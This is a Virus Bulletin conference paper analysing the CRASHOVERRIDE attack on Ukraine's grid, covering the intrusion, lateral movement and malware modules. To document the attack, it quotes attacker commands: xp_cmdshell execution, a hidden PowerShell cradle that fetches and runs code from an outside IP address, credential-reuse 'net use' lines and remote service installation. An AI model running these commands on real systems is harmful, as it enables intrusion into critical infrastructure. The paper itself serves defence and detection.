<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: VB2018 paper: Anatomy of an attack: detecting and defeating CRASHOVERRIDE</title>
<meta name="description" content="CRASHOVERRIDE is the first publicly known malware designed to impact electric grid operations. Reviewing previously unavailable data covering logs, forensics, and various incident information, in this paper Joe Slowik outlines the CRASHOVERRIDE attack in its entirety, from breach of the ICS network through delivery and execution of ICS-specific payloads." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 6205;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/blocks/expand_collapse_toc/templates/vbexpand/view.css" />
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/jquery.color.js"></script>
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<h1><a class="chapter" name="h1-vb2018-paper-anatomy-attack-detecting-and-defeating-crashoverride"></a>VB2018 paper: Anatomy of an attack: detecting and defeating CRASHOVERRIDE</h1>
<h3><a class="chapter" name="h3-joe-slowik"></a>Joe Slowik</h3>
<p>Dragos, USA</p>
<p><em>Copyright © 2018 Virus Bulletin</em></p>
<hr />
<p> </p>
<div class="ccm-expand-collapse-toc">
<div id="ccm-expand-collapse-toc-title-13310" class="ccm-expand-collapse-toc-title ccm-expand-collapse-toc-closed" data-expander-speed="500">Table of contents</div><div id="ccm-expand-collapse-toc-content-13310" class="ccm-expand-collapse-toc-content"><p><a class="toc-level2" href="#h2-abstract">Abstract</a><br /> <a class="toc-level2" href="#h2-background">Background</a><br /> <a class="toc-level2" href="#h2-adversary">Adversary</a><br /> <a class="toc-level2" href="#h2-initial-intrusion">Initial intrusion</a><br /> <a class="toc-level2" href="#h2-pivoting-ics">Pivoting to ICS</a><br /> <a class="toc-level2" href="#h2-movement-within-ics">Movement within ICS</a><br /> <a class="toc-level2" href="#h2-crashoverride">CRASHOVERRIDE</a><br /> <a class="toc-level3" href="#h3-crashoverride-modules">CRASHOVERRIDE modules</a><br /> <a class="toc-level4" href="#h4-launcher-module">Launcher module</a><br /> <a class="toc-level4" href="#h4-brief-review-grid-operations-protocols">Brief review of grid operations protocols</a><br /> <a class="toc-level4" href="#h4-iec-101">IEC-101</a><br /> <a class="toc-level4" href="#h4-iec-104">IEC-104</a><br /> <a class="toc-level4" href="#h4-iec-61850">IEC-61850</a><br /> <a class="toc-level4" href="#h4-opc">OPC</a><br /> <a class="toc-level4" href="#h4-hybrid-payload-opc-61850">Hybrid payload: OPC + 61850</a><br /> <a class="toc-level4" href="#h4-wiper-module">Wiper module</a><br /> <a class="toc-level3" href="#h3-primary-backdoor-module">Primary backdoor module</a><br /> <a class="toc-level3" href="#h3-impeding-recovery">Impeding recovery</a><br /> <a class="toc-level3" href="#h3-alternate-backdoor">Alternate backdoor</a><br /> <a class="toc-level2" href="#h2-context-and-mitigation">Context and mitigation</a><br /> <a class="toc-level2" href="#h2-acknowledgements">Acknowledgements</a><br /> <a class="toc-level2" href="#h2-references">References</a><br /> <a class="toc-level2" href="#h2-footnotes">Footnotes</a><br /> <a class="toc-level2" href="#h2-appendix-list-sample-hashes">Appendix A – List of sample hashes</a><br /> <a class="toc-level2" href="#h2-appendix-b-remote-execution-and-survey-script">Appendix B – Remote execution and survey script</a></p><p>&nbsp;</p></div></div>
<h2><a class="chapter" name="h2-abstract"></a>Abstract</h2>
<p>CRASHOVERRIDE is the first publicly known malware designed to impact electric grid operations. While some attention has already been paid to CRASHOVERRIDE’s ICS-specific effects, the broader scope of the attack – and the prerequisites for its execution – have been woefully under-examined.</p>
<p>Reviewing previously unavailable data covering logs, forensics, and various incident information, this paper will outline the CRASHOVERRIDE attack in its entirety, from breach of the ICS network through delivery and execution of ICS-specific payloads. This examination will show that, aside from the requirement to develop and deploy ICS-targeting software for its final effects, CRASHOVERRIDE largely relied upon fairly standard intrusion techniques in order to achieve its results. By understanding this methodology and how these techniques can be monitored and detected, ICS asset owners and defenders can begin to identify detection and visibility gaps in order to catch such techniques in the future.</p>
<p>While CRASHOVERRIDE effectively represents a new application of malware to produce a physical impact, the underlying techniques for intrusion and deployment would immediately be recognizable even to a junior penetration tester. In demystifying this attack, defenders and testers can gain greater appreciation both for the existing vulnerabilities within electric grid operations and for the steps required to build effective defences.</p>
<p> </p>
<h2><a class="chapter" name="h2-background"></a>Background</h2>
<p>At the time of its discovery, CRASHOVERRIDE was the second publicly known ICS-targeting malware, and the first to target the electric grid (see Figure 1). While previous operations had taken place against electric grid operations (most notably the 2015 Ukraine outage attributed to SANDWORM) none had used malware to deliver, semi-autonomously, the actual ICS impact.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/2015/3966/9868/figure1_ICS_Malware_Events.png" alt="figure1_ICS_Malware_Events.png" width="685" height="377" /><span class="centered-caption">Figure 1: ICS malware events.</span></p>
<p>Initial public reporting of the attack focused on CRASHOVERRIDE’s impact on energy grid operations, which included a relatively brief blackout in a specific Kiev substation in late December 2016. While concerning, CRASHOVERRIDE’s ultimate, direct effects were rather unimpressive considering the underlying possibilities of the malware in question. Much more concerning than the immediate impact was the implicit message behind the attack: that adversaries were now able and willing to invest time and resources in developing software specifically designed to manipulate electric grid operations.</p>
<p>CRASHOVERRIDE itself is a modular malware framework designed to deploy several ICS protocol-specific attack payloads in order to disrupt electricity distribution. Given this function, CRASHOVERRIDE must be deployed on an endpoint within the target network that is capable of directly manipulating or communicating with ICS controlling equipment. Furthermore, CRASHOVERRIDE will only function if supplied with the appropriate protocol-specific communication module for the equipment in the victim environment.</p>
<p>CRASHOVERRIDE’s implementation and execution is certainly interesting, but the attack itself represents the final action in a complex, multi-staged sequence. Devoting inordinate attention to CRASHOVERRIDE’s final attack sequence ignores the multiple stages prior to effect delivery during which this assault could have been detected, stopped, or mitigated.</p>
<p>While an understanding of CRASHOVERRIDE’s fundamentals is important, and will be addressed in this paper, CRASHOVERRIDE is best understood as an event with multiple, inter-dependent stages. As shown in Figure 2, the actual implementation of the malware represents the final stage in a complex operation.<a class=" anchor" name="figure2"></a></p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/2415/3966/9924/figure2_ICS_Cyber_Kill_Chain.PNG" alt="figure2_ICS_Cyber_Kill_Chain.PNG" width="449" height="630" /><span class="centered-caption">Figure 2: ICS cyber kill chain.</span></p>
<p>Understanding how these individual, dependent actions work with each other enables us to form a better understanding of CRASHOVERRIDE as an attack, starting with the initial intrusion into the IT network, all the way through to the execution of an ICS disruptive payload. By taking this approach, ICS owners and operators can identify multiple potential points at which a CRASHOVERRIDE-like attack can be detected, mitigated and defeated before it reaches the final stages of the ICS cyber kill chain.</p>
<p> </p>
<h2><a class="chapter" name="h2-adversary"></a>Adversary</h2>
<p>Following analysis of CRASHOVERRIDE in mid-2017, researchers at <em>Dragos</em> identified strong links between the entity executing the CRASHOVERRIDE attack and the SANDWORM APT actor that was responsible for the 2015 Ukraine outage [<a href="#ref1">1</a>]. Subsequent investigation and analysis of confidential information indicated that the group responsible for CRASHOVERRIDE, ELECTRUM, may previously have served as the ICS capability development team for SANDWORM, and possibly executed greater operational autonomy with respect to 2016 events in Kiev. Henceforth, when referring to the adversary executing the CRASHOVERRIDE attack, this paper will default to ELECTRUM.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/7415/3966/9980/figure3_ELECTRUM_Overview.png" alt="figure3_ELECTRUM_Overview.png" width="360" height="601" /><span class="centered-caption">Figure 3: ELECTRUM overview.</span></p>
<p>Based on its association with SANDWORM, ELECTRUM aligns with Russian strategic interests and is believed to be a capable, well-resourced adversary. While many aspects of ELECTRUM’s activity remain uncertain, available information indicates that the group possesses specialized development capabilities for ICS-specific software and remains operationally active.</p>
<p> </p>
<h2><a class="chapter" name="h2-initial-intrusion"></a>Initial intrusion</h2>
<p>Initial infection vectors are often very difficult to identify post-incident when viewing information gleaned through external research. Based on available evidence and subsequent information in this paper, we can identify the initial intrusion to the target environment as possibly having emerged from a phishing campaign as early as January 2016. This earliest possible date places events in Ukraine almost a year prior to the CRASHOVERRIDE impact, and mere weeks following the 2015 Ukrainian power event. Based on analysis of additional recovered artifacts, we can say that initial access and entrenchment in the IT network was achieved no later than October 2016.</p>
<p> </p>
<h2><a class="chapter" name="h2-pivoting-ics"></a>Pivoting to ICS</h2>
<p>Specific information on how ELECTRUM navigated from IT to ICS – a critical inflection point for ICS intrusion events – remains elusive. Based on information presented in the next section, ELECTRUM most likely leveraged credential capture on compromised IT machines to build up a corpus of logons and additional authentication information. From this step, and similar in some respects to the 2015 Ukrainian power outage, ELECTRUM would re-use legitimate credentials to remotely log onto machines within the ICS environment, or leverage existing VPN connections.</p>
<p>From recovered log and system data, we know that the adversary initially accessed a device in early December that was either dual-homed on the IT and ICS networks or featured connectivity to the IT network. This compromise pre-dated any other interactions with hosts in the ICS environment. Given this timeline information and initial activity focusing on user account manipulation in early December, ELECTRUM appears to have used this device as its ‘beach head’ within the ICS network.</p>
<p>Starting on 1 December 2016 at 01:28 (unspecified time zone in recovered log data), rapid user account modifications take place on this initial ICS access server focused on two newly created accounts, ‘admin’ and ‘система’ (System). The accounts are created, assigned to a domain matching local operations, and privileges delegated before event logging on the impacted system is disabled at 01:29. The speed of the above operations implies at minimum adversary scripting to make multiple changes within a short span of time.</p>
<p> </p>
<h2><a class="chapter" name="h2-movement-within-ics"></a>Movement within ICS</h2>
<p>ELECTRUM activity then appeared to slow within the network, until a significant and rapid resumption of operations on 12 December 2016. At this point, a new host appears in the records. Based on captured artifacts and logs, this new host was a <em>Microsoft Windows Server 2003</em> device running <em>Microsoft SQL Server</em>. Subsequent investigation indicated that two other similar devices, featuring the same naming schema (e.g. ‘Device-1’, ‘Device-2’, etc.), were also accessed by the attacker. Within an ICS environment a database server can act as a type of data historian for process and control system information [<a href="#ref2">2</a>]. In this role, the devices would be expected to have extensive connections to other hosts within the network – including devices that are either directly involved in critical process operations, or that are directly connected to such hosts.</p>
<p>The first signs of interaction occurred at approximately 13:00 on 12 December 2016, with several actions that appeared to be initial reconnaissance. For example, ELECTRUM began querying directory info, performing directory listings, and testing network connectivity. These actions continued for approximately two hours and included network connectivity checks to other named resources in the victim environment. This suggests the attacker had already performed sufficient reconnaissance of the ICS environment to have identified hosts of interest. Unfortunately, corresponding log data was not available to provide definitive evidence to back up this assumption.</p>
<p>ELECTRUM then executed a script to test authentication capability to a series of named hosts within the control system network. While the original script was not recovered, in log data a series of rapid RPC authentication attempts to multiple hosts were observed for user ‘Administrator’ with the same password across over 100 endpoints, specified by host name. The combination of credential specificity and host-name identification strongly indicates significant reconnaissance activity having taken place between initial access to the ICS environment in early December and the observed activity in mid-December.</p>
<p>In both this activity and other survey, reconnaissance and execution items, nearly all commands across all three server hosts were executed in the following manner:</p>
<pre>EXEC xp_cmdshell &lt;command&gt;</pre>
<p>The above format adds concrete evidence to the theory that the server hosts were MS-SQL servers, as ‘xp_cmdshell’ is an MS-SQL command that allows for the execution of arbitrary commands [<a href="#ref3">3</a>]. From this, ELECTRUM appears to leverage MS-SQL access to the central ‘pivot’ machines in order to gain code execution throughout the ICS environment. By identifying both a means to occupy a strategic, central node for the victim network and an effective, but not easy-to-identify method for command execution, ELECTRUM placed itself in an excellent position to broaden the scope of the compromise.</p>
<p>In addition to the above, ELECTRUM also attempted to create a link between servers [<a href="#ref4">4</a>]. While the exact destination server was not recovered in data, the following command was observed:</p>
<pre>“BEGIN EXEC master.dbo.sp_addlinkedserver @server = N’” &amp; strLink &amp; “’, @srvproduct=N’SQL Server’; EXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname=N’” &amp; strLink &amp; “’,@useself=N’False’,@rmtuser=N’admin’,@rmtpassword=’&lt;PASSWORD&gt;’; END;”</pre>
<p>ELECTRUM used a variety of native system commands, known utilities, and custom scripts from the core server hosts. With the exception of a UPX-packed copy of Mimikatz<a href="#footnote1"><sup>1</sup></a>, no actual malware aside from the final CRASHOVERRIDE payload was observed in available data. Examples of commands executed include the following:</p>
<pre>EXEC xp_cmdshell ‘net use L: \\&lt;TargetIP&gt;\$C &lt;Password&gt; /USER:&lt;Domain&gt;\&lt;User&gt;’;<br />EXEC xp_cmdshell ‘move C:\Delta\m32.txt C:\Delta\m32.exe’;<br />EXEC xp_cmdshell ‘netstat -an’;</pre>
<p>The ‘move’ command is interesting, as it reflects behaviour seen in multiple instances where ELECTRUM transferred files into the ICS network as ‘.txt’ extensions. After moving the relevant files to victims in the ICS environment, the files were renamed as ‘.exe’ items using the move command prior to further operations. While simple and not especially elegant, such a technique can be used to defeat very simple detection methodologies based on extension tracking.</p>
<p>In addition, scripts and the <em>SysInternals PSExec</em> program were used for additional functions. Of note, ELECTRUM renamed the <em>PSExec</em> executable ‘ps.exe’ and used an older version than the latest available at the time of the attack. While <em>PSExec 2.2</em>, published in July 2016, would have been the most recent version, ELECTRUM instead utilized version 2.11, published in April 2014 [<a href="#ref5">5</a>].</p>
<p>From a script perspective, multiple VBS and BAT scripts were used in the event to facilitate file movement, system survey, and as a wrapper for PowerShell execution. For example, one lengthy script, ‘remote.vbs’, provides the ability to remotely query another system when given an IP, user name, and password. The script itself (provided in Appendix B) is essentially a collection of benign WMI and similar queries used to perform system survey information and command execution. Looking at the source code, there are overlaps with multiple publicly available examples for running WMI queries but no exact matches. Examples of script use for remote process execution include the following:</p>
<pre>EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:&lt;TargetIP&gt; /u:&lt;UserName&gt; /p:&lt;Password&gt; /t:-r arp -a’<br />EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:&lt;TargetIP&gt; /u:&lt;UserName&gt; /p:&lt;Password&gt; /t:-r dir C:\intel\’;</pre>
<p>A different example is a simple BAT script used to execute PowerShell:</p>
<pre>powershell.exe -nop -w hidden -c $l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring(‘http://188.42.253.43:8801/msupdate’);</pre>
<p>Aside from being proxy-aware, the above is a simple, unobfuscated PowerShell script used to retrieve a file. Unfortunately, at the time of discovery the resource specified was no longer available, so its exact function and purpose are unknown.</p>
<p>Fuelling much, if not most of this activity was the ability to capture and reuse legitimate network credentials within the victim environment. As stated previously, the adversary used Mimikatz for this purpose. Most interestingly for the assumed level of attack sophistication and the wide variety of options available for obfuscating Mimikatz or running it within memory, ELECTRUM simply compiled the publicly available Mimikatz source code and packed it with UPX. While the tool itself remains effective, from a detection and mitigation standpoint this choice is very curious.</p>
<p>Tying all of the above together, ELECTRUM leveraged a combination of scripts, remote process execution and credential harvesting to penetrate the environment and ‘seed’ it with a final, malicious payload: CRASHOVERRIDE.</p>
<p> </p>
<h2><a class="chapter" name="h2-crashoverride"></a>CRASHOVERRIDE</h2>
<p>After extensive environmental survey activity and verifying access in the 12 to 15 December 2016 time period, ELECTRUM proceeded to push the CRASHOVERRIDE framework to target hosts around 16 December 2016. After verifying connectivity and other operations, on 17 December ELECTRUM began pushing out malicious software to hosts connected to the server machines using a BAT file which called two, unrecovered VBS scripts. Although the exact content of the VBS items is unknown, review of the BAT indicates that they copy files to remote hosts and then verify via a directory listing. Of note, the BAT contains hard-coded addresses and separate files exist for each of the CRASHOVERRIDE payload modules <em>except</em> the ‘launcher’ module.</p>
<p>Example lines from ‘101_copy.bat’ and ‘104_copy.bat’ include the following:</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\ImapiService.exe” “C:\Delta\svchost.exe”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\101.dll” “C:\Delta\101.dll”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\139.ini” “C:\Delta\101.ini”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\haslo.dat” “C:\Delta\haslo.dat”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\sqlc.vbs “&lt;TargetIP&gt;” “-c”</p>
<p class="monospace" style="padding-left: 30px;">“dir C:\Delta\”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\ImapiService.exe” “C:\Delta\svchost.exe”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\104.dll” “C:\Delta\104.dll”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\140.ini” “C:\Delta\104.ini”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\ufn.vbs &lt;TargetIP&gt;</p>
<p class="monospace" style="padding-left: 30px;">“C:\Backinfo\haslo.dat” “C:\Delta\haslo.dat”</p>
<p class="monospace" style="padding-left: 30px;">cscript C:\Backinfo\sqlc.vbs “&lt;TargetIP&gt;” “-c”</p>
<p class="monospace" style="padding-left: 30px;">“dir C:\Delta\”</p>
<p>At a high level, CRASHOVERRIDE itself consists of at least three pieces (and in most cases, four): a launcher executable; an ICS protocol-specific payload module in DLL form; a wiper payload module, also in DLL form; and a configuration file for most of the effects payloads.</p>
<p>Of note, the above scripts do <em>not</em> include copying of the CRASHOVERRIDE launcher module. Artifacts relating to this event were not available, but given past observed activity, a likely option for moving this module to target devices would be the NET USE command or similar activity. The most likely reason for separating these actions is target specificity: while the CRASHOVERRIDE launcher module is common across all attack types, specific payload modules are required for different target devices. By copying the ‘core’ component first, along with other operations, ELECTRUM could conduct appropriate surveillance to determine what ICS targets link to victim hosts, and thus select the appropriate ICS effects payload module for deployment.</p>
<p>Once copied over, CRASHOVERRIDE is created and started as a system service in all observed cases except in the standalone OPC module. ELECTRUM uses the ‘remote.vbs’ script, described above, to call ‘sc config’ and related commands to start services on remote systems. For example:</p>
<pre>EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:&lt;TargetIP&gt; /u:&lt;Host/Domain&gt;\&lt;User&gt; /p:&lt;Password&gt; /t:-c sc config imapiservice binPath= “C:\Intel\imapi.exe C:\Intel\ imapi.dll i.ini” start= auto’;</pre>
<p>Separate commands are issued to start the service, which will also start on system boot. The ‘binPath’ setting indicates the calling convention for CRASHOVERRIDE:</p>
<pre>CoreExecutable WorkingDirectory PayloadModule ConfigurationFile</pre>
<p>While the service is started manually and set to auto-start on boot when configured, actual execution waits due to a timing function within the binary that is set to a hard-coded value. The specific coding routine is shown in Figure 4 and works to set a ‘trigger event’ for actual payload execution and to coordinate execution across multiple installations or victim hosts.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/3415/3967/0414/figure4_CRASHOVERRIDE_Launcher_Timing_Function.png" alt="figure4_CRASHOVERRIDE_Launcher_Timing_Function.png" width="842" height="565" /><span class="centered-caption">Figure 4: CRASHOVERRIDE launcher timing function.</span></p>
<p>One item of immediate interest in analysing the available data is that ELECTRUM’s actions in copying the CRASHOVERRIDE payloads to hosts and executing them as services did not rely on a reported custom backdoor that was identified in the attack [<a href="#ref6">6</a>]. While this backdoor software was recovered from compromised hosts and existed within the environment, all identified data from recovered log and forensics information indicates that native system commands combined with credential re-use were used to deploy and execute ICS impact packages – with no indications of custom malware having been used (or needed) to produce this effect. While it is possible that evidence outside of what was available for this analysis does exist for use of the custom backdoor, a review of operations indicates that such malware was completely unnecessary to achieve the desired effect.</p>
<p>Before proceeding with further information about the attack, a review of the specific CRASHOVERRIDE components is required.</p>
<p> </p>
<h3><a class="chapter" name="h3-crashoverride-modules"></a>CRASHOVERRIDE modules</h3>
<p>CRASHOVERRIDE is a modular framework consisting of multiple, dependent parts. As shown in Figure 5, the ‘launcher’ module serves as the base for subsequent operations and provides the framework for subsequent effects modules to execute. Each effects module is specially purposed for either a specific ICS communication protocol or the general ‘wiping’ module. The process for an ICS attack entails the launcher module calling the exported ‘Crash’ function from a payload DLL that was specified when launched, using a configuration file to determine targets (depending on payload), and then automatically calling the wiper component – also a DLL exporting ‘Crash’ – after a cool-down period.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/9115/3967/0612/figure5_CRASHOVERRIDE_Program_Flow.png" alt="figure5_CRASHOVERRIDE_Program_Flow.png" width="729" height="729" /><span class="centered-caption">Figure 5: CRASHOVERRIDE program flow.</span></p>
<p> </p>
<h4><a class="chapter" name="h4-launcher-module"></a>Launcher module</h4>
<p>All recovered launcher modules feature relatively simplistic functionality. At a high level, they are designed as service executables that call the ‘Crash’ export for the provided DLL based on the calling parameters documented previously. Of interest, the launcher samples we analysed contained several hard-coded parameters, including a service name for the created service (examples include ‘defragsvc’ and ‘imapiservice’) and execution times for the payload after service start. Examples of execution times identified include:</p>
<p class="monospace" style="padding-left: 30px;">December 17, 2016 22:27 UTC</p>
<p class="monospace" style="padding-left: 30px;">December 20, 2016 06:30 UTC</p>
<p>After reaching the hard-coded time value, the service hands off execution to the relevant payload or effects DLL to begin producing the intended ICS impact. Two hours after initial attack execution, the launcher module moves execution to the destructive or ‘wiper’ module.</p>
<p> </p>
<h4><a class="chapter" name="h4-brief-review-grid-operations-protocols"></a>Brief review of grid operations protocols</h4>
<p>Electric distribution operations leverage supervisory control and data acquisition (SCADA) systems to manage grid operations across geographically distributed areas. Facilitating this activity are specific protocols designed to communicate with equipment from centralized operations centres. Protocols are often vendor- or region-specific. For example, IEC-101 and IEC-104, both of which are used in CRASHOVERRIDE, are generally used only in Europe and parts of the Middle East and Asia. North American operations typically rely on Distributed Network Protocol 3 (DNP3) for the same functionality. While all provide the same base-level capabilities, their implementations are somewhat different, meaning that ICS communications must be designed for the specific grid operations implementation at play. Figure 6 provides an overview of how various protocols ‘flow’ through a simplistic grid operations network design, highlighting the four protocols used in CRASHOVERRIDE: IEC-101, IEC-104, IEC-61850, and OPC DA. Additional information on grid operations and functionality can be found in the <em>Dragos</em> CRASHOVERRIDE whitepaper [<a href="#ref7">7</a>].</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/1615/3967/0719/Figure6_CRASHOVERRIDE_Protocols_In_Context.png" alt="Figure6_CRASHOVERRIDE_Protocols_In_Context.png" width="474" height="461" /><span class="centered-caption">Figure 6: CRASHOVERRIDE protocols in context.</span><br /><br /></p>
<h4><a class="chapter" name="h4-iec-101"></a>IEC-101</h4>
<p>IEC-101 is a grid operations protocol mostly found in Europe as well as parts of Asia and the Middle East. Unlike the other protocols leveraged in CRASHOVERRIDE, IEC-101 uses serial communications (instead of TCP/IP) to control and communicate with equipment. The IEC-101 DLL (in all recovered cases creatively named ‘101.dll’) requires a configuration file that specifies Information Object Address (IOA) values. Ultimately, the module is designed simply to change the state of IOAs in order to switch physical breaker status from closed to open, or vice versa.</p>
<p> </p>
<h4><a class="chapter" name="h4-iec-104"></a>IEC-104</h4>
<p>IEC-104 is, in many respects, the same as IEC-101, except for the fact that communications take place over TCP/IP. As a result, the configuration file for IEC-104 payloads requires a target IP address, with the attack package focused on the same open/closed effect as seen in IEC-101. As shown in Figure 7, IEC-104 module execution flow is quite straightforward: the launcher calls the exported ‘Crash’ function from the IEC-104 DLL; a client thread is created; depending on configuration, a new communication process is started or an existing IEC-104 communications process is replaced; a socket is formed to controlled devices to begin sending traffic; traffic is recorded to a log file. Once this routine is complete, execution is handed back to the launcher to await the countdown triggering the destructive module.</p>
